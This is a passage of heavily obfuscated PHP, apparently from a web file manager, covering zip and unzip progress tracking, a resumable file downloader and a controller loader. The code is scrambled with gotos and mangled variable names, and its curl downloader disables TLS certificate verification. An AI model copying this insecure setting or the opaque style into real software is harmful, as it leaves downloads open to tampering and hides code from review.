$eøèúâåµÕ[$Aå’‚ÃΩ¡∑[1203]] : array(); $f¬É°Êë≥‹[] = HttpHeader::code($eøèúâåµÕ[$Aå’‚ÃΩ¡∑[1036]]); goto f≈¯¢âíû≈; e≠ãõ¢çßñ: } } goto DÃùü∆ﬂ≠â; câáé§∏Íµ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto F¥øöã≤Í¨; D†„Ñ∏˜®—: if (!$dÇ¥®Ìı‡®[$F…Èá¡Éû[1325]]) { $dÇ¥®Ìı‡®[$F…Èá¡Éû[1325]] = LNG($F…Èá¡Éû[1486]); } goto Fù’©»çÁ©; d≠·àÊºÀ®: Hook::bind($F…Èá¡Éû[1039], array($this, $F…Èá¡Éû[1484])); $dÇ¥®Ìı‡® =& $this->task; $dÇ¥®Ìı‡®[$F…Èá¡Éû[1485]] = $F…Èá¡Éû[1044]; goto D†„Ñ∏˜®—; F¥øöã≤Í¨: $F…Èá¡Éû =& $_SERVER[—Ω]; parent::startAfter(); Hook::bind($F…Èá¡Éû[1482], array($this, $F…Èá¡Éû[1483])); goto d≠·àÊºÀ®; Fù’©»çÁ©: } protected function endAfter() { $eîßêÜ√©º =& $_SERVER[—Ω]; parent::endAfter(); Hook::unbind($eîßêÜ√©º[1482], array($this, $eîßêÜ√©º[1483])); Hook::unbind($eîßêÜ√©º[1039], array($this, $eîßêÜ√©º[1484])); } public function updateAfter() { $FÁÇÉãáöÕ =& $_SERVER[—Ω]; $dóÖ¬Ó©÷œ =& $this->task; if (!$dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[982]] || !$dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[708]]) { return; } if ($dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1485]] == $FÁÇÉãáöÕ[1044]) { $Dï¥¶•ï⁄≤ = 0; if ($dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1462]]) { $Dï¥¶•ï⁄≤ = $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1463]] / $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1462]]; } $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1418]] = $Dï¥¶•ï⁄≤ * 0.3; } else { if ($dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1485]] == $FÁÇÉãáöÕ[298]) { $Dï¥¶•ï⁄≤ = $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[994]] / $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[982]]; $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1418]] = 0.3 + $Dï¥¶•ï⁄≤ * 0.4; } else { if ($dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1485]] == $FÁÇÉãáöÕ[91]) { $C√πÂÑﬁèÏ = 0; if ($dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1464]] == $FÁÇÉãáöÕ[91]) { $C√πÂÑﬁèÏ = $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1463]]; } $Dï¥¶•ï⁄≤ = ($dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1467]] + $C√πÂÑﬁèÏ) / $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[708]]; $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1418]] = 0.3 + 0.4 + $Dï¥¶•ï⁄≤ * 0.3; } } } if ($dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1418]] > 0) { $BÀù≈”…¶Ö = timeFloat() - $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1420]] - $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1423]]; $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1424]] = $BÀù≈”…¶Ö * (1 - $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1418]]) / $dóÖ¬Ó©÷œ[$FÁÇÉãáöÕ[1418]]; } } public function addFile($AüƒÛÊ°õµ) { goto E€Ùáπ–€ø; FÖÈéêí∫ù: $bæ‰ì†ºë[$fáÚ˘Œ‰óœ[984]] = $fáÚ˘Œ‰óœ[1475]; $bæ‰ì†ºë[$fáÚ˘Œ‰óœ[1464]] = $fáÚ˘Œ‰óœ[1044]; $bæ‰ì†ºë[$fáÚ˘Œ‰óœ[708]] = $E‹¯ŒëÍ≤¿[$fáÚ˘Œ‰óœ[77]]; goto BëàüåÚ’Ï; EΩÇ±≈¢‹: $this->update(); goto cÕßåüÓ§î; cÓ‚ÚÂÖßè: $bæ‰ì†ºë[$fáÚ˘Œ‰óœ[1460]] = $E‹¯ŒëÍ≤¿[$fáÚ˘Œ‰óœ[28]]; $bæ‰ì†ºë[$fáÚ˘Œ‰óœ[1462]] = $E‹¯ŒëÍ≤¿[$fáÚ˘Œ‰óœ[77]]; $bæ‰ì†ºë[$fáÚ˘Œ‰óœ[1463]] = 0; goto FÖÈéêí∫ù; E€Ùáπ–€ø: $fáÚ˘Œ‰óœ =& $_SERVER[—Ω]; $bæ‰ì†ºë =& $this->task; $E‹¯ŒëÍ≤¿ = IO::info($AüƒÛÊ°õµ); goto cÓ‚ÚÂÖßè; BëàüåÚ’Ï: $bæ‰ì†ºë[$fáÚ˘Œ‰óœ[982]] = 1; $c¨€ºÊÚ¯¯ = 0; $bæ‰ì†ºë[$fáÚ˘Œ‰óœ[1468]] = array($fáÚ˘Œ‰óœ[1469] => $c¨€ºÊÚ¯¯ + 1, $fáÚ˘Œ‰óœ[383] => $E‹¯ŒëÍ≤¿[$fáÚ˘Œ‰óœ[28]], $fáÚ˘Œ‰óœ[75] => $E‹¯ŒëÍ≤¿[$fáÚ˘Œ‰óœ[75]], $fáÚ˘Œ‰óœ[462] => $E‹¯ŒëÍ≤¿[$fáÚ˘Œ‰óœ[462]] ? $E‹¯ŒëÍ≤¿[$fáÚ˘Œ‰óœ[462]] : $E‹¯ŒëÍ≤¿[$fáÚ˘Œ‰óœ[75]]); goto EΩÇ±≈¢‹; cÕßåüÓ§î: } public function unzipAfter($E∂ŸíîÚﬁù) { goto C–º£˘äº§; BÜ“©…”Œ¥: if ($f¿¡È·åπ¡[$AÑõçµÂ‰π[29]] == $AÑõçµÂ‰π[164]) { $bÃﬁãä±˘ê[$AÑõçµÂ‰π[982]] = 1; } else { $bÃﬁãä±˘ê[$AÑõçµÂ‰π[982]] = $f¿¡È·åπ¡[$AÑõçµÂ‰π[80]][$AÑõçµÂ‰π[78]]; } $bÃﬁãä±˘ê[$AÑõçµÂ‰π[984]] = $AÑõçµÂ‰π[33]; $bÃﬁãä±˘ê[$AÑõçµÂ‰π[1464]] = 0; goto CÀºƒÍ™Ã•; C–º£˘äº§: $AÑõçµÂ‰π =& $_SERVER[—Ω]; $bÃﬁãä±˘ê =& $this->task; $bÃﬁãä±˘ê[$AÑõçµÂ‰π[1485]] = $AÑõçµÂ‰π[91]; goto C‘ç»ç⁄·ô; C‘ç»ç⁄·ô: $f¿¡È·åπ¡ = IO::infoWithChildren($E∂ŸíîÚﬁù); $aÊ…éÖÈØ√ = 0; $bÃﬁãä±˘ê[$AÑõçµÂ‰π[1468]] = array($AÑõçµÂ‰π[1469] => $aÊ…éÖÈØ√ + 1, $AÑõçµÂ‰π[383] => $f¿¡È·åπ¡[$AÑõçµÂ‰π[28]], $AÑõçµÂ‰π[75] => $f¿¡È·åπ¡[$AÑõçµÂ‰π[75]], $AÑõçµÂ‰π[462] => $f¿¡È·åπ¡[$AÑõçµÂ‰π[462]] ? $f¿¡È·åπ¡[$AÑõçµÂ‰π[462]] : $f¿¡È·åπ¡[$AÑõçµÂ‰π[75]]); goto BÜ“©…”Œ¥; CÀºƒÍ™Ã•: $bÃﬁãä±˘ê[$AÑõçµÂ‰π[994]] = 0; $bÃﬁãä±˘ê[$AÑõçµÂ‰π[1462]] = 0; $bÃﬁãä±˘ê[$AÑõçµÂ‰π[1463]] = 0; goto BãëáË ì—; dúñü‘°Ü: $this->update(); self::log($AÑõçµÂ‰π[1487] . json_encode(array($bÃﬁãä±˘ê, $f¿¡È·åπ¡))); goto d·‹ËÑÆÎ“; BãëáË ì—: $bÃﬁãä±˘ê[$AÑõçµÂ‰π[1460]] = $AÑõçµÂ‰π[33]; $bÃﬁãä±˘ê[$AÑõçµÂ‰π[1467]] = 0; $bÃﬁãä±˘ê[$AÑõçµÂ‰π[708]] = $f¿¡È·åπ¡[$AÑõçµÂ‰π[77]]; goto dúñü‘°Ü; d·‹ËÑÆÎ“: } public function nameParse($d™óÑ‘ÕÓâ) { goto eà≥£Î±ﬂﬁ; eíΩ’äÁıË: $this->update(); goto D’∫√≥êØ¡; aÍ´¿èÃëö: $Cîâ†ò‘Ó™ = get_path_this($d™óÑ‘ÕÓâ); if (strstr($Cîâ†ò‘Ó™, $E◊„‰€‘ñ◊[93])) { $EÒÇ¥Í“µÚ[$E◊„‰€‘ñ◊[994]] += 1; $EÒÇ¥Í“µÚ[$E◊„‰€‘ñ◊[982]] += 1; } $EÒÇ¥Í“µÚ[$E◊„‰€‘ñ◊[1460]] = $d™óÑ‘ÕÓâ; goto eíΩ’äÁıË; eà≥£Î±ﬂﬁ: $E◊„‰€‘ñ◊ =& $_SERVER[—Ω]; $EÒÇ¥Í“µÚ =& $this->task; if ($EÒÇ¥Í“µÚ[$E◊„‰€‘ñ◊[1485]] == $E◊„‰€‘ñ◊[1044]) { $EÒÇ¥Í“µÚ[$E◊„‰€‘ñ◊[1485]] = $E◊„‰€‘ñ◊[298]; $EÒÇ¥Í“µÚ[$E◊„‰€‘ñ◊[1467]] = 0; $EÒÇ¥Í“µÚ[$E◊„‰€‘ñ◊[708]] = 0; } goto aÍ´¿èÃëö; D’∫√≥êØ¡: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $dªı˜âÜåâ =& $_SERVER[—Ω]; parent::startAfter(); Hook::bind($dªı˜âÜåâ[1488], array($this, $dªı˜âÜåâ[1483])); $Eõø«Óâı¶ =& $this->task; $Eõø«Óâı¶[$dªı˜âÜåâ[1485]] = $dªı˜âÜåâ[1044]; if (!$Eõø«Óâı¶[$dªı˜âÜåâ[1325]]) { $Eõø«Óâı¶[$dªı˜âÜåâ[1325]] = LNG($dªı˜âÜåâ[1489]); } } protected function endAfter() { $DÑ‘√Ü≈éã =& $_SERVER[—Ω]; parent::endAfter(); Hook::unbind($DÑ‘√Ü≈éã[1488], array($this, $DÑ‘√Ü≈éã[1483])); } public function updateAfter() { $FìùöãÙöﬂ =& $_SERVER[—Ω]; $FÛœ÷ìùÃà =& $this->task; if (!$FÛœ÷ìùÃà[$FìùöãÙöﬂ[982]] || !$FÛœ÷ìùÃà[$FìùöãÙöﬂ[708]]) { return; } if ($FÛœ÷ìùÃà[$FìùöãÙöﬂ[1485]] == $FìùöãÙöﬂ[1044]) { $CÖﬁ™™§¡‰ = $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1463]]; if ($FÛœ÷ìùÃà[$FìùöãÙöﬂ[1464]] != $FìùöãÙöﬂ[1044]) { $CÖﬁ™™§¡‰ = 0; } $AΩÉ£∑É⁄‡ = ($FÛœ÷ìùÃà[$FìùöãÙöﬂ[1467]] + $CÖﬁ™™§¡‰) / $FÛœ÷ìùÃà[$FìùöãÙöﬂ[708]]; $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1418]] = $AΩÉ£∑É⁄‡ * 0.3; } else { if ($FÛœ÷ìùÃà[$FìùöãÙöﬂ[1485]] == $FìùöãÙöﬂ[298]) { $AΩÉ£∑É⁄‡ = $FÛœ÷ìùÃà[$FìùöãÙöﬂ[994]] / $FÛœ÷ìùÃà[$FìùöãÙöﬂ[982]]; $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1418]] = 0.3 + $AΩÉ£∑É⁄‡ * 0.5; } else { if ($FÛœ÷ìùÃà[$FìùöãÙöﬂ[1485]] == $FìùöãÙöﬂ[91]) { $AΩÉ£∑É⁄‡ = 0; if ($FÛœ÷ìùÃà[$FìùöãÙöﬂ[1462]]) { $AΩÉ£∑É⁄‡ = $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1463]] / $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1462]]; } $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1418]] = 0.3 + 0.5 + $AΩÉ£∑É⁄‡ * 0.2; } } } if ($FÛœ÷ìùÃà[$FìùöãÙöﬂ[1418]] > 0) { $EÚÑ◊©⁄§“ = timeFloat() - $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1420]] - $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1423]]; $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1424]] = $EÚÑ◊©⁄§“ * (1 - $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1418]]) / $FÛœ÷ìùÃà[$FìùöãÙöﬂ[1418]]; } } public function copyFileStart($CÎÇΩ‚ñ“‰, $FÃÃı≥Ê∏, $bú√ﬂ’áª€, $FƒÇ≤ß›©í, $Dû«ôñΩ¡ó, $aÙåöÔëßÈ) { $aÔÃäˆ’Àˆ =& $_SERVER[—Ω]; parent::copyFileStart($CÎÇΩ‚ñ“‰, $FÃÃı≥Ê∏, $bú√ﬂ’áª€, $FƒÇ≤ß›©í, $Dû«ôñΩ¡ó, $aÙåöÔëßÈ); $E™∫è∂¡¨î =& $this->task; if ($E™∫è∂¡¨î[$aÔÃäˆ’Àˆ[1485]] == $aÔÃäˆ’Àˆ[298]) { $E™∫è∂¡¨î[$aÔÃäˆ’Àˆ[1485]] = $aÔÃäˆ’Àˆ[91]; } $this->update(); } public function copyFileEnd($eÚ èÚ€Çñ, $e≥Ù∂¯œï¶, $d≠œÿÀ“ñƒ, $F¶òﬂıﬁÖ¨, $Aı›ùÕ¢öò, $DçéŸÉíÁ≥) { $e≠é©≈∫Íê =& $_SERVER[—Ω]; $Aìå˘Ù˘·À =& $this->task; $Aìå˘Ù˘·À[$e≠é©≈∫Íê[1463]] = $Aìå˘Ù˘·À[$e≠é©≈∫Íê[1462]]; $Aìå˘Ù˘·À[$e≠é©≈∫Íê[1467]] += $Aìå˘Ù˘·À[$e≠é©≈∫Íê[1462]]; $Aìå˘Ù˘·À[$e≠é©≈∫Íê[1464]] = $e≠é©≈∫Íê[33]; $this->update(); } public function nameParse($e⁄Ñò «¥§) { $C¥Ó•Ê¯…‹ =& $_SERVER[—Ω]; $eﬁÏˆé∑‰Ø =& $this->task; if ($eﬁÏˆé∑‰Ø[$C¥Ó•Ê¯…‹[994]] < $eﬁÏˆé∑‰Ø[$C¥Ó•Ê¯…‹[982]]) { $B–ÜÔŒŸø≈ = get_path_this($e⁄Ñò «¥§); if (strstr($B–ÜÔŒŸø≈, $C¥Ó•Ê¯…‹[93])) { $eﬁÏˆé∑‰Ø[$C¥Ó•Ê¯…‹[994]] += 1; } } if ($eﬁÏˆé∑‰Ø[$C¥Ó•Ê¯…‹[1485]] == $C¥Ó•Ê¯…‹[1044]) { $eﬁÏˆé∑‰Ø[$C¥Ó•Ê¯…‹[1485]] = $C¥Ó•Ê¯…‹[298]; } $eﬁÏˆé∑‰Ø[$C¥Ó•Ê¯…‹[1460]] = $e⁄Ñò «¥§; $this->update(); } } class Downloader { static function start($BÁÛü™â©˘, $C¬Ùπ’ø™˘, $eÏ°Í⁄µÒÂ = 10) { goto F∞Öã„‹¬†; C≠ƒ‡åô—≥: if (!$BÁÛü™â©˘) { return array($B∆öÜëÿˆ≤[1036] => !1, $B∆öÜëÿˆ≤[1038] => $B∆öÜëÿˆ≤[1041]); } if (!$B≥ òùÍﬁç[$B∆öÜëÿˆ≤[1285]] || $B≥ òùÍﬁç[$B∆öÜëÿˆ≤[322]] == 0) { @unlink($EÖÂ‡ÉàßΩ); @unlink($C¬Ùπ’ø™˘); $dÂáäÙèÑ… = self::fileDownloadFopen($BÁÛü™â©˘, $C¬Ùπ’ø™˘, $B≥ òùÍﬁç[$B∆öÜëÿˆ≤[322]]); if ($dÂáäÙèÑ…[$B∆öÜëÿˆ≤[1036]]) { return $dÂáäÙèÑ…; } else { @unlink($EÖÂ‡ÉàßΩ); @unlink($C¬Ùπ’ø™˘); $dÂáäÙèÑ… = self::fileDownloadCurl($BÁÛü™â©˘, $C¬Ùπ’ø™˘, !1, 0, $B≥ òùÍﬁç[$B∆öÜëÿˆ≤[322]]); @unlink($EÖÂ‡ÉàßΩ); return $dÂáäÙèÑ…; } } $Dƒ˜ È‰âﬂ = is_file($EÖÂ‡ÉàßΩ) ? filesize($EÖÂ‡ÉàßΩ) : 0; goto B¬îï∆ØêÇ; eËªÀß£Î‘: if ($Dƒ˜ È‰âﬂ > $CÁ•êﬁ§¥¬) { @unlink($EÖÂ‡ÉàßΩ); } file_put_contents($eÖﬂÛ´≠Æ¡, json_encode($D⁄ •ÇÔ±º)); $dÂáäÙèÑ… = self::fileDownloadCurl($BÁÛü™â©˘, $C¬Ùπ’ø™˘, !0, $Dƒ˜ È‰âﬂ, $CÁ•êﬁ§¥¬); goto DïÉ´ëÖó¢; Búá˘òÛü√: if (is_file($eÖﬂÛ´≠Æ¡)) { $AÀ≥ÑúÂ¿û = file_get_contents($eÖﬂÛ´≠Æ¡); $D⁄ •ÇÔ±º = json_decode($AÀ≥ÑúÂ¿û, 1); } if (file_exists($C¬Ùπ’ø™˘) && $CÁ•êﬁ§¥¬ == filesize($C¬Ùπ’ø™˘)) { @unlink($EÖÂ‡ÉàßΩ); @unlink($eÖﬂÛ´≠Æ¡); return array($B∆öÜëÿˆ≤[1036] => !0, $B∆öÜëÿˆ≤[1038] => $B∆öÜëÿˆ≤[1493]); } if ($D⁄ •ÇÔ±º[$B∆öÜëÿˆ≤[322]] != $CÁ•êﬁ§¥¬) { $D⁄ •ÇÔ±º = array($B∆öÜëÿˆ≤[322] => $CÁ•êﬁ§¥¬); } goto eËªÀß£Î‘; F∞Öã„‹¬†: $B∆öÜëÿˆ≤ =& $_SERVER[—Ω]; if (!request_url_safe($BÁÛü™â©˘)) { return array($B∆öÜëÿˆ≤[1036] => !1, $B∆öÜëÿˆ≤[1038] => $B∆öÜëÿˆ≤[1041]); } $eÖﬂÛ´≠Æ¡ = $C¬Ùπ’ø™˘ . $B∆öÜëÿˆ≤[1490]; goto bÏ†∞ˆâ¯À; B¬îï∆ØêÇ: $CÁ•êﬁ§¥¬ = intval($B≥ òùÍﬁç[$B∆öÜëÿˆ≤[322]]); if (file_exists($EÖÂ‡ÉàßΩ) && time() - filemtime($EÖÂ‡ÉàßΩ) < 3) { return array($B∆öÜëÿˆ≤[1036] => !1, $B∆öÜëÿˆ≤[1038] => $B∆öÜëÿˆ≤[1492]); } $D⁄ •ÇÔ±º = array(); goto Búá˘òÛü√; bÏ†∞ˆâ¯À: $EÖÂ‡ÉàßΩ = $C¬Ùπ’ø™˘ . $B∆öÜëÿˆ≤[1491]; if (is_array($BÁÛü™â©˘)) { $B≥ òùÍﬁç = $BÁÛü™â©˘; } else { $B≥ òùÍﬁç = url_header($BÁÛü™â©˘); } $BÁÛü™â©˘ = $B≥ òùÍﬁç[$B∆öÜëÿˆ≤[292]]; goto C≠ƒ‡åô—≥; DïÉ´ëÖó¢: if ($dÂáäÙèÑ…[$B∆öÜëÿˆ≤[1036]]) { @unlink($eÖﬂÛ´≠Æ¡); } return $dÂáäÙèÑ…; goto f∫üä”Ù”÷; f∫üä”Ù”÷: } static function fileDownloadFopen($d”„ñÈ∏ë‹, $D´é¢√˘›Ì, $d§ˆäıÊë∂ = 0) { $b»’ºÑâŒç =& $_SERVER[—Ω]; @ini_set($b»’ºÑâŒç[1494], $b»’ºÑâŒç[1495]); $aﬁô‰⁄Ã˜” = $D´é¢√˘›Ì . $b»’ºÑâŒç[1491]; set_timeout(); @unlink($aﬁô‰⁄Ã˜”); if ($c»ÛÁ‹¢°Í = @fopen($d”„ñÈ∏ë‹, $b»’ºÑâŒç[1496])) { goto AŒ·ú‡â∑«; Aú¯Ñâˆ¨ﬂ: fclose($c»ÛÁ‹¢°Í); $e¿çé ßù® = filesize(iconv_system($aﬁô‰⁄Ã˜”)); if ($d§ˆäıÊë∂ != 0 && $e¿çé ßù® != $d§ˆäıÊë∂) { return array($b»’ºÑâŒç[1036] => !1, $b»’ºÑâŒç[1038] => $b»’ºÑâŒç[1500]); } goto dªç ëÈË±; AŒ·ú‡â∑«: if (!($Bïû·óÍﬁî = @fopen($aﬁô‰⁄Ã˜”, $b»’ºÑâŒç[1497]))) { return array($b»’ºÑâŒç[1036] => !1, $b»’ºÑâŒç[1038] => $b»’ºÑâŒç[1498]); } while (!feof($c»ÛÁ‹¢°Í)) { if (!file_exists($aﬁô‰⁄Ã˜”)) { fclose($Bïû·óÍﬁî); return array($b»’ºÑâŒç[1036] => !1, $b»’ºÑâŒç[1038] => $b»’ºÑâŒç[1499]); } clearstatcache(); if ($d§ˆäıÊë∂ > 0 && $d§ˆäıÊë∂ == filesize(iconv_system($aﬁô‰⁄Ã˜”))) { break; } fwrite($Bïû·óÍﬁî, fread($c»ÛÁ‹¢°Í, 1024 * 8), 1024 * 8); } fclose($Bïû·óÍﬁî); goto Aú¯Ñâˆ¨ﬂ; dªç ëÈË±: self::checkGzip($aﬁô‰⁄Ã˜”); if (!@rename($aﬁô‰⁄Ã˜”, $D´é¢√˘›Ì)) { usleep(round(rand(0, 1000) * 50)); @unlink($D´é¢√˘›Ì); $fÛ¨‚ñÎéÂ = @rename($aﬁô‰⁄Ã˜”, $D´é¢√˘›Ì); if (!$fÛ¨‚ñÎéÂ) { return array($b»’ºÑâŒç[1036] => !1, $b»’ºÑâŒç[1038] => $b»’ºÑâŒç[1501]); } } return array($b»’ºÑâŒç[1036] => !0, $b»’ºÑâŒç[1038] => $b»’ºÑâŒç[706]); goto EÕâö£ÿ≈é; EÕâö£ÿ≈é: } else { return array($b»’ºÑâŒç[1036] => !1, $b»’ºÑâŒç[1038] => $b»’ºÑâŒç[1502]); } } static function fileDownloadCurl($d‘â≠£òÿì, $F…©∏Óãúó, $Fø£¡˜˜õƒ = false, $c–ÉöÖæΩ´ = 0, $d÷ãÖ¿ï∑ﬁ = 0) { goto dâŸÃ⁄¯ƒÕ; B„ àã•ª¨: curl_setopt($aﬂõ¿•·©Ñ, CURLOPT_NOPROGRESS, !1); curl_setopt($aﬂõ¿•·©Ñ, CURLOPT_PROGRESSFUNCTION, $dÜÙÓ¶‰èÖ[1504]); curl_progress_start($aﬂõ¿•·©Ñ); goto Eú™Ìßú”ø; Eú™Ìßú”ø: curl_setopt($aﬂõ¿•·©Ñ, CURLOPT_USERAGENT, $dÜÙÓ¶‰èÖ[1495]); $bãáÁ√Ïß„ = curl_exec($aﬂõ¿•·©Ñ); curl_progress_end($aﬂõ¿•·©Ñ); goto E¯çΩè…å; fÖ⁄ÔßñÑÃ: curl_setopt($aﬂõ¿•·©Ñ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($aﬂõ¿•·©Ñ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($aﬂõ¿•·©Ñ, CURLOPT_SSL_VERIFYHOST, 0); goto B„ àã•ª¨; BÌÏﬂ»®ôÈ: return array($dÜÙÓ¶‰èÖ[1036] => !1, $dÜÙÓ¶‰èÖ[1038] => $dÜÙÓ¶‰èÖ[1506]); goto e∑∏¢â©Æç; A∫›·ÇÙ√ë: if ($A¨∑êÖ€ê« < $d÷ãÖ¿ï∑ﬁ && $d÷ãÖ¿ï∑ﬁ != 0) { return array($dÜÙÓ¶‰èÖ[1036] => !1, $dÜÙÓ¶‰èÖ[1038] => $dÜÙÓ¶‰èÖ[1492]); } if ($A¨∑êÖ€ê« > $d÷ãÖ¿ï∑ﬁ && $d÷ãÖ¿ï∑ﬁ != 0) { return array($dÜÙÓ¶‰èÖ[1036] => !1, $dÜÙÓ¶‰èÖ[1038] => $dÜÙÓ¶‰èÖ[1500]); } if ($bãáÁ√Ïß„ && filesize($f”∆ïºÔÙ∫) != 0) { self::checkGzip($f”∆ïºÔÙ∫); if (!@rename($f”∆ïºÔÙ∫, $F…©∏Óãúó)) { @unlink($F…©∏Óãúó); $bãáÁ√Ïß„ = @rename($f”∆ïºÔÙ∫, $F…©∏Óãúó); if (!$bãáÁ√Ïß„) { return array($dÜÙÓ¶‰èÖ[1036] => !1, $dÜÙÓ¶‰èÖ[1038] => $dÜÙÓ¶‰èÖ[1505]); } } return array($dÜÙÓ¶‰èÖ[1036] => !0, $dÜÙÓ¶‰èÖ[1038] => $dÜÙÓ¶‰èÖ[706]); } goto BÌÏﬂ»®ôÈ; a◊◊⁄Ö∂¢ó: $f∂òËàèá = @fopen($f”∆ïºÔÙ∫, $dÜÙÓ¶‰èÖ[986]); if (!$f∂òËàèá) { return array($dÜÙÓ¶‰èÖ[1036] => !1, $dÜÙÓ¶‰èÖ[1038] => $dÜÙÓ¶‰èÖ[1503]); } $aﬂõ¿•·©Ñ = curl_init($d‘â≠£òÿì); goto BÍóÙøªœ◊; E¯çΩè…å: curl_close($aﬂõ¿•·©Ñ); fclose($f∂òËàèá); $A¨∑êÖ€ê« = filesize(iconv_system($f”∆ïºÔÙ∫)); goto A∫›·ÇÙ√ë; dâŸÃ⁄¯ƒÕ: $dÜÙÓ¶‰èÖ =& $_SERVER[—Ω]; $f”∆ïºÔÙ∫ = $F…©∏Óãúó . $dÜÙÓ¶‰èÖ[1491]; set_timeout(); goto a◊◊⁄Ö∂¢ó; BÍóÙøªœ◊: if ($Fø£¡˜˜õƒ) { curl_setopt($aﬂõ¿•·©Ñ, CURLOPT_RANGE, $c–ÉöÖæΩ´ . $dÜÙÓ¶‰èÖ[724]); } curl_setopt($aﬂõ¿•·©Ñ, CURLOPT_FILE, $f∂òËàèá); curl_setopt($aﬂõ¿•·©Ñ, CURLOPT_REFERER, get_url_link($d‘â≠£òÿì)); goto fÖ⁄ÔßñÑÃ; e∑∏¢â©Æç: } static function checkGzip($f√ù¬÷„Àû) { goto BòÃè´ ©; BòÃè´ ©: $E± ñªøÌ¶ = $_SERVER[—Ω][1507]; $aÉäÆë€Ìı = file_sub_str($f√ù¬÷„Àû, 0, 2); if ($E± ñªøÌ¶ != $aÉäÆë€Ìı) { return; } goto dŒ»⁄ã‘‡í; eÿ’Ÿ∑“åè: file_put_contents($f√ù¬÷„Àû, $d∂ﬂÎ∫Ùè∂); goto fäµÖø¡ää; dŒ»⁄ã‘‡í: ob_start(); readgzfile($f√ù¬÷„Àû); $d∂ﬂÎ∫Ùè∂ = ob_get_clean(); goto eÿ’Ÿ∑“åè; fäµÖø¡ää: } } goto Aõ≠À—¨ñ–; fñÛÎíÚ¥ã: function Action($fŒ≤ø›áß„ = '') { goto dú˘´ˆ∂ç≈; dú˘´ˆ∂ç≈: $F≤Èíê⁄¢õ =& $_SERVER[ªƒÓ™éå]; static $Cü„Úôª©™ = array(); $fŒ≤ø›áß„ = trim(str_replace($F≤Èíê⁄¢õ[4], $F≤Èíê⁄¢õ[5], $fŒ≤ø›áß„), $F≤Èíê⁄¢õ[4]); goto c¯®º√çÉ»; c¯®º√çÉ»: $EëªïºÈÇº = explode($F≤Èíê⁄¢õ[5], $fŒ≤ø›áß„); $fãóö™¡≈ = strtolower($EëªïºÈÇº[0]); if (substr($fãóö™¡≈, -6) == $F≤Èíê⁄¢õ[6]) { $fŒ≤ø›áß„ = substr($EëªïºÈÇº[0], 0, -6); $C≤ÜÔ¨•äè = $fŒ≤ø›áß„ . $F≤Èíê⁄¢õ[7]; $f›Ë»≠ÿùﬁ = $F≤Èíê⁄¢õ[8]; if (isset($EëªïºÈÇº[1]) && substr(strtolower($EëªïºÈÇº[1]), -5) == $F≤Èíê⁄¢õ[9]) { $C≤ÜÔ¨•äè = $fŒ≤ø›áß„ . $EëªïºÈÇº[1]; $f›Ë»≠ÿùﬁ = $F≤Èíê⁄¢õ[10] . $EëªïºÈÇº[1] . $F≤Èíê⁄¢õ[11]; } else { if (count($EëªïºÈÇº) == 3) { $C≤ÜÔ¨•äè = $fŒ≤ø›áß„ . $EëªïºÈÇº[1] . $EëªïºÈÇº[2]; $f›Ë»≠ÿùﬁ = $F≤Èíê⁄¢õ[12] . $EëªïºÈÇº[1] . $F≤Èíê⁄¢õ[13] . $EëªïºÈÇº[2] . $F≤Èíê⁄¢õ[11]; } } $f›Ë»≠ÿùﬁ = PLUGIN_DIR . $fŒ≤ø›áß„ . $F≤Èíê⁄¢õ[4] . $f›Ë»≠ÿùﬁ; } else { if (substr($fãóö™¡≈, -5) == $F≤Èíê⁄¢õ[9]) { $fŒ≤ø›áß„ = substr($EëªïºÈÇº[0], 0, -5); return Model($fŒ≤ø›áß„); } else { $C≤ÜÔ¨•äè = $EëªïºÈÇº[0] . $EëªïºÈÇº[1]; $f›Ë»≠ÿùﬁ = CONTROLLER_DIR . $EëªïºÈÇº[0] . $F≤Èíê⁄¢õ[4] . $EëªïºÈÇº[1] . $F≤Èíê⁄¢õ[14]; } } goto bÊﬁ≥¶éÆÜ; f∑ôïÈªõ≈: if (!class_exists($C≤ÜÔ¨•äè)) { return actionCallError("\133{$fŒ≤ø›áß„}\x20\75\x3e\40{$C≤ÜÔ¨•äè}\x5d\x20\x63\154\x61\163\x73\x20\x6e\x6f\x74\40\145\170\x69\x73\x74\163\x21"); } $Cü„Úôª©™[$Böè¿·ûıÿ] = new $C≤ÜÔ¨•äè(); return $Cü„Úôª©™[$Böè¿·ûıÿ]; goto DøÎ©ã≠ø∆; bÊﬁ≥¶éÆÜ: $Böè¿·ûıÿ = strtolower($C≤ÜÔ¨•äè); if (isset($Cü„Úôª©™[$Böè¿·ûıÿ])) { return $Cü„Úôª©™[$Böè¿·ûıÿ]; } if (is_file($f›Ë»≠ÿùﬁ)) { 